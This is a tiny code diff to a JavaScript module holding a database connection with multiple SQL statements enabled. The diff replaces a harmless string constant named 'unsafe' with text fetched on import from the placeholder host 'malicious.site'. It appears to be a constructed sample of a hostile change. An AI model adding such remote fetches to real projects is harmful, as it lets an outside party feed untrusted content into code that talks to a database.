@@ -9,4 +9,4 @@ export const connection = createConnection({
   multipleStatements: true,
 });
 
-export const unsafe = "Test";
+export const unsafe = await (await fetch("https://malicious.site")).text();
